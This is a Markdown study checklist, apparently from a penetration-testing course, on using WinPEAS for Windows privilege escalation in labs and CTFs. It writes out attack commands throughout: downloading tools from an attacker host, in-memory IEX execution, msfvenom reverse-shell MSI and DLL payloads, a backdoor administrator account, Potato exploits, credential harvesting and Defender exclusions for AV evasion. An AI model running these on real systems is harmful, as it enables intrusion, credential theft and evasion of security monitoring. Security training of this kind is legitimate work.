# 🏆 WinPEAS: Complete Mastery Checklist

> **What is WinPEAS?** WinPEAS (Windows Privilege Escalation Awesome Script) is a privilege escalation enumeration script for Windows. It automatically checks hundreds of misconfigurations, weak permissions, stored credentials, and known vulnerable configurations across a compromised Windows system — outputting color-coded results that highlight likely escalation paths.
>
> **Why does it exist?** Manual Windows privilege escalation enumeration requires checking dozens of different categories: service permissions, registry keys, scheduled tasks, stored credentials, unquoted paths, token privileges, and more. WinPEAS automates all of it in one run, surfacing the highest-probability escalation vectors first.
>
> **When to use it:** Immediately after gaining an initial foothold on a Windows machine. Post-exploitation privilege escalation assessment. CTF machines and HackTheBox/TryHackMe Windows boxes. Internal penetration tests after establishing a beachhead.
>
> **When to avoid it:** When stealth is critical — WinPEAS is noisy (many file and registry accesses, network calls). When AV/EDR is active — WinPEAS is well-known and flagged by many security products. In those cases, run individual manual checks or use obfuscated/modified versions.
>
> **What mastering WinPEAS unlocks:** Systematic Windows privilege escalation. Understanding of every Windows escalation category. The ability to understand the output and prioritize what actually leads to escalation vs. false alarms.

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 5 | 2–3 hours |
| 2 | Running WinPEAS | 4 | 2–3 hours |
| 3 | Reading the Output | 5 | 3–5 hours |
| 4 | Key Escalation Paths | 5 | 4–6 hours |
| 5 | Evading Detection | 3 | 2–3 hours |
| 6 | Manual Verification | 3 | 2–3 hours |
| 7 | Practical Labs | 4 | 5–8 hours |
| 8 | Mastery Challenges | 3 | 3–5 hours |
| | **Total** | **32** | **~23–36 hours** |

**Prerequisites:** Basic Windows command line. Understanding of Windows services, registry, and permissions model. A foothold on a Windows machine (any user — WinPEAS works as a low-priv user, though some checks require admin).

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — Windows Privilege Escalation Categories

- [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Service Exploits** | Misconfigured service permissions, unquoted service paths, weak service binary paths. |
| **Registry** | AlwaysInstallElevated (MSI files run as SYSTEM). AutoRun keys writable by low-priv users. |
| **Scheduled Tasks** | Task binary writable by low-priv user. Task runs as SYSTEM or higher privilege. |
| **Stored Credentials** | Windows Credential Manager. Registry (`HKLM\SOFTWARE\...` autologin). Unattended install files (`unattend.xml`). WinRM/SSH config files. |
| **DLL Hijacking** | Service or process looks for DLL in writable directory first. |
| **Token Privileges** | `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege` → Potato attacks. `SeBackupPrivilege` → read any file. `SeDebugPrivilege` → inject into processes. |
| **Kernel Exploits** | Unpatched OS. `systeminfo` → compare against known CVEs. Last resort. |

---

### Task 1.2 — WinPEAS Variants

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **winPEASx64.exe** | 64-bit compiled binary. Most common. Use on 64-bit systems. |
| **winPEASx86.exe** | 32-bit binary. Use when targeting 32-bit processes or older systems. |
| **winPEASany.exe** | .NET any CPU — runs on both. Larger. |
| **winPEAS.bat** | Pure batch file, no binary. No .NET required. Less comprehensive but works anywhere. |
| **Download** | GitHub: `github.com/peass-ng/PEASS-ng/releases`. Include in your toolkit. |

---

### Task 1.3 — Transfer Methods

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **HTTP Server** | `python3 -m http.server 8080` on Kali. On target: `certutil -urlcache -split -f http://kali_ip:8080/winPEASx64.exe winpeas.exe`. Or PowerShell: `IWR http://kali_ip:8080/winPEASx64.exe -OutFile winpeas.exe`. |
| **SMB Server** | `impacket-smbserver share $(pwd) -smb2support`. On target: `copy \\kali_ip\share\winPEASx64.exe .`. |
| **Paste** | Base64 encode on Kali → paste into PowerShell → decode to file. For air-gapped situations. |

---

### Task 1.4 — Running Location

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Writable Dirs** | `C:\Windows\Temp\`. `C:\Users\<user>\AppData\Local\Temp\`. Upload here. |
| **AV Note** | AV often scans `Temp`. Consider: `C:\ProgramData\` or a custom directory if AV is active. |
| **In Memory** | `IEX (New-Object Net.WebClient).DownloadString('http://kali/winPEASx64.exe')` — doesn't touch disk (for .NET-based). Not reliable for binary EXE. |

---

### Task 1.5 — LinPEAS for Linux Comparison

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **LinPEAS** | Same project — LinPEAS for Linux. Same color coding system. Same output structure. |
| **Same Workflow** | Learn WinPEAS output → LinPEAS output is intuitive by comparison. |
| **Color Code** | Red/Yellow = high probability escalation path. Green = interesting but lower priority. Blue = informational. |

---

# PHASE 2: RUNNING WINPEAS

---

### Task 2.1 — Basic Run

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Command** | `.\winPEASx64.exe` — full run, all checks. Takes 2–5 minutes. |
| **Redirect Output** | `.\winPEASx64.exe | Out-File -Encoding ascii winpeas_output.txt`. Transfer back to Kali for offline review. `.\winPEASx64.exe > winpeas.txt 2>&1`. |
| **Wait** | Don't interrupt. Let it finish. Incomplete runs miss checks. |

---

### Task 2.2 — Specific Category Runs

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Specific Check** | `.\winPEASx64.exe systeminfo` — only system info. `.\winPEASx64.exe servicesinfo` — only service checks. `.\winPEASx64.exe windowscreds` — only credential checks. |
| **All Categories** | `.\winPEASx64.exe help` — lists all available categories. |
| **Fast Run** | `.\winPEASx64.exe fast` — skips slow checks (network, some registry scans). Good when time is limited. |

---

### Task 2.3 — PowerShell vs CMD

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **PowerShell** | Preferred. Color output works well. `.\winPEASx64.exe` from PS. |
| **CMD** | Works but color may not render. `winPEASx64.exe > output.txt` still captures all results. |
| **Execution Policy** | If PS blocks: `powershell -ep bypass -c ".\winPEASx64.exe"`. |

---

### Task 2.4 — Reviewing Output Offline

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Transfer** | SCP the output file to Kali. `scp user@target:C:/Windows/Temp/winpeas.txt .`. |
| **Grep** | `grep -i "red\|high\|vuln\|password\|cred\|VULNERABLE" winpeas.txt`. |
| **Sections** | Output is divided into clearly labeled sections. Search for specific section headers: `grep -i "services\|credentials\|token\|registry" winpeas.txt`. |

---

# PHASE 3: READING THE OUTPUT

---

### Task 3.1 — System Information Section

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **OS Version** | Windows Server 2019 / Windows 10 1903 etc. → check against known kernel exploits (only as last resort). |
| **Hotfixes** | List of applied patches. Missing hotfixes + known CVEs → check `windows-exploit-suggester`. |
| **Architecture** | 32/64-bit. Affects which exploit binaries to use. |
| **AV Products** | WinPEAS lists detected security products. Guides exploit/bypass selection. |
| **AMSI/Defender** | Note if Windows Defender is active. |

---

### Task 3.2 — Current User Privileges

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Token Privileges** | WinPEAS highlights dangerous privileges in red: `SeImpersonatePrivilege` → PrintSpoofer, GodPotato, RoguePotato. `SeBackupPrivilege` → read SAM, SYSTEM registry hives → extract all local hashes. `SeDebugPrivilege` → inject into SYSTEM processes → dump credentials. `SeLoadDriverPrivilege` → load malicious kernel driver. |
| **Check Manually** | `whoami /priv` — verify the output. |

---

### Task 3.3 — Services Section

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Unquoted Path** | Service path without quotes containing spaces: `C:\Program Files\My App\service.exe`. Windows tries: `C:\Program.exe`, `C:\Program Files\My.exe`, then the full path. Plant executable in writable location earlier in the path. |
| **Writable Binary** | Service binary that low-priv user can overwrite. Replace with malicious binary. |
| **Writable Config** | Service config (registry) that low-priv user can modify. Change binary path. |
| **WinPEAS Highlights** | These show in red/yellow. Always verify manually: `sc qc ServiceName`. `icacls "C:\path\to\service.exe"`. |

---

### Task 3.4 — Credentials Section

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Windows Vault** | WinPEAS dumps Windows Credential Manager entries. May contain network credentials, web credentials. |
| **Registry Passwords** | AutoLogon registry keys: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` — DefaultUserName, DefaultPassword. |
| **Unattend Files** | `unattend.xml`, `sysprep.xml` — Windows installation answer files. Often contain base64-encoded admin passwords. WinPEAS searches common locations. |
| **GPP Passwords** | Group Policy Preferences XML files with cpassword (AES-256 encrypted but key is public). |
| **PowerShell History** | `C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` — commands typed in PowerShell sessions. Credentials often visible. |

---

### Task 3.5 — Scheduled Tasks and Registry

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Scheduled Tasks** | Tasks running as SYSTEM with binaries writable by low-priv user. WinPEAS flags these. Verify: `schtasks /query /fo LIST /v | findstr "Task\|Run As\|Task To Run"`. |
| **AlwaysInstallElevated** | Registry key: `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1` AND `HKLM\...`. If both set: create malicious MSI → runs as SYSTEM. |
| **AutoRun** | Writable AutoRun registry entries. Replace the binary path with malicious executable. |

---

# PHASE 4: KEY ESCALATION PATHS

---

### Task 4.1 — SeImpersonatePrivilege → SYSTEM

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Who Has It** | IIS AppPool accounts, SQL Server service accounts, network service accounts. Very common. |
| **Exploit** | PrintSpoofer: `.\PrintSpoofer.exe -i -c cmd`. GodPotato: `.\GodPotato.exe -cmd "cmd /c whoami"`. RoguePotato, SweetPotato: alternatives. |
| **Result** | SYSTEM shell. Immediate full system compromise. |

---

### Task 4.2 — Unquoted Service Path

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Find** | WinPEAS flags unquoted paths. Verify: `wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'`. |
| **Check Writable** | Can you write to the parent directory? `icacls "C:\Program Files"`. |
| **Exploit** | Plant `C:\Program.exe` (reverse shell). Wait for service restart or restart it: `sc stop ServiceName; sc start ServiceName`. |

---

### Task 4.3 — Writable Service Binary

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Find** | WinPEAS: services section with writable binaries. Verify: `icacls "C:\path\service.exe"`. |
| **Exploit** | Backup original. Replace with malicious binary (reverse shell, add admin user). Restart service. |
| **Add Admin User** | `cmd.exe /c net user hacker P@ss123 /add && net localgroup administrators hacker /add`. |

---

### Task 4.4 — AlwaysInstallElevated

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Check** | WinPEAS flags this. Manual: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`. |
| **Exploit** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali LPORT=4444 -f msi > shell.msi`. `msiexec /quiet /qn /i shell.msi` → SYSTEM shell. |

---

### Task 4.5 — DLL Hijacking

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Find** | Procmon on the target: filter CreateFile + NAME NOT FOUND + ends with .dll. Find privileged processes missing DLLs. |
| **Check Writable** | Is the directory where the DLL is searched for writable? `icacls "C:\path\"`. |
| **Exploit** | Generate malicious DLL: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali LPORT=4444 -f dll > missing.dll`. Place in the writable directory. Restart the service/process. |

---

# PHASE 5: EVADING DETECTION

---

### Task 5.1 — AV Evasion Basics

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Problem** | WinPEAS is flagged by Windows Defender and most AV. |
| **Options** | Use the .bat version (less detections). Compile WinPEAS from source with modifications (strings changed). Use obfuscation tools. Run manual enumeration commands instead. |
| **Exclusion** | If you have admin: `Add-MpPreference -ExclusionPath "C:\Temp"` → add AV exclusion → run WinPEAS. But you need admin first. |

---

### Task 5.2 — Manual Alternatives

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **System Info** | `systeminfo`. `whoami /priv`. `whoami /groups`. |
| **Services** | `sc query`. `wmic service get name,pathname,startmode`. |
| **Scheduled Tasks** | `schtasks /query /fo LIST /v`. |
| **Credentials** | `reg query HKCU /f password /t REG_SZ /s`. `dir C:\ /s /b | findstr /i "unattend\|sysprep"`. |
| **PowerShell History** | `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. |

---

### Task 5.3 — Other Enumeration Tools

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **PowerUp** | PowerShell script. `Import-Module .\PowerUp.ps1; Invoke-AllChecks`. Similar to WinPEAS but PS-based. Often less detected. |
| **Seatbelt** | C# tool for detailed enumeration. More stealthy than WinPEAS. Specific category checks. |
| **PrivescCheck** | PowerShell script. Good alternative. `.\PrivescCheck.ps1 -Extended`. |

---

# PHASE 6: MANUAL VERIFICATION

---

### Task 6.1 — Verify Every WinPEAS Finding

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Rule** | WinPEAS flags potential issues. Not every flag is exploitable. Always manually verify before spending time on exploitation. |
| **Service** | WinPEAS says service binary writable → `icacls "path"` → confirm you have write permission → confirm service runs as SYSTEM → then exploit. |
| **Credential** | WinPEAS finds autologon password → `reg query HKLM\...Winlogon` → confirm it's there → try the credential. |

---

### Task 6.2 — Cross-Referencing with GTFOBins/LOLBAS

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **LOLBAS** | `lolbas-project.github.io` — Living Off the Land Binaries, Scripts and Libraries. Windows binaries that can be abused for privilege escalation, execution, download. |
| **GTFOBins** | `gtfobins.github.io` — Unix binaries (relevant for WSL or if Linux is in scope). |
| **Cross-reference** | WinPEAS finds an interesting binary → check LOLBAS for escalation techniques. |

---

### Task 6.3 — Token Privilege Verification

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Check** | `whoami /priv` — list all token privileges and their states. `Enabled` = active. `Disabled` = present but not yet enabled (can be enabled programmatically). |
| **Enable** | Some tools (Potato exploits) enable privileges automatically. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — Run WinPEAS on a Vulnerable VM

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Download a vulnerable Windows VM (e.g., TryHackMe Steel Mountain, HTB Bastard). Transfer WinPEAS. Run it. Read the full output. Identify the top 3 escalation vectors. Verify each manually. |
| **Success Criteria** | Output reviewed. Top 3 vectors identified and manually verified. |

---

### Lab 7.2 — SeImpersonatePrivilege Exploitation

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | Set up a Windows VM with a service running as Network Service (has SeImpersonate). Gain access as that service account. WinPEAS shows SeImpersonatePrivilege. Use PrintSpoofer or GodPotato to escalate to SYSTEM. |
| **Success Criteria** | SYSTEM shell obtained via Potato/PrintSpoofer. |

---

### Lab 7.3 — Service Binary Replacement

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Create a Windows service with a binary in a location writable by a low-priv user. Log in as low-priv user. WinPEAS finds it. Replace the binary with a reverse shell. Restart the service. Catch SYSTEM shell. |
| **Success Criteria** | Reverse shell caught as SYSTEM. |

---

### Lab 7.4 — Full HTB/THM Windows Box

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | HackTheBox or TryHackMe Windows machine. Gain initial foothold → transfer WinPEAS → analyze output → exploit the correct vector → SYSTEM → root.txt. |
| **Success Criteria** | root.txt captured. Full kill chain documented with WinPEAS output highlighted. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — No WinPEAS (Manual Only)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | Privilege escalate a Windows VM using only manual commands (no WinPEAS, no PowerUp). Find the vulnerability through manual `icacls`, `schtasks`, `reg query`, and `whoami /priv` checks. |
| **Success Criteria** | SYSTEM achieved without automated tools. All manual commands documented. |

---

### Challenge 8.2 — AV Active Environment

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | Windows machine with Defender enabled and real-time protection on. WinPEAS is quarantined. Use alternative tools (PrivescCheck, Seatbelt, manual commands) to enumerate and escalate. |
| **Success Criteria** | Privilege escalation achieved without triggering AV quarantine. |

---

### Challenge 8.3 — Full Report

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 90 min

| **Scenario** | After escalating a Windows lab VM: write a professional privilege escalation report. Include: initial access level, WinPEAS findings, manual verification steps, exploitation technique, impact, and remediation recommendations for each finding. |
| **Success Criteria** | Professional report written. Each finding documented with evidence, impact, and remediation. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can transfer and run WinPEAS on a Windows target | ☐ |
| Can read and prioritize WinPEAS color-coded output | ☐ |
| Can identify and exploit SeImpersonatePrivilege | ☐ |
| Can identify and exploit unquoted service paths | ☐ |
| Can identify and exploit writable service binaries | ☐ |
| Can identify and exploit AlwaysInstallElevated | ☐ |
| Can find stored credentials in registry and files | ☐ |
| Can manually verify WinPEAS findings before exploiting | ☐ |
| Can enumerate manually when WinPEAS is blocked by AV | ☐ |
| Can write a privilege escalation report | ☐ |

---

## 🎯 Interview Questions

1. What categories does WinPEAS check for privilege escalation?
2. What is an unquoted service path and how do you exploit it?
3. What does SeImpersonatePrivilege allow and how do Potato exploits use it?
4. Where does WinPEAS look for stored credentials?
5. What is AlwaysInstallElevated and why is it dangerous?
6. How do you run WinPEAS when Windows Defender is blocking it?
7. What is the color coding system in WinPEAS output?
8. How do you verify a WinPEAS finding before attempting exploitation?
9. What is PowerUp and when would you use it instead of WinPEAS?
10. How do you use SeBackupPrivilege to read the SAM and SYSTEM hives?
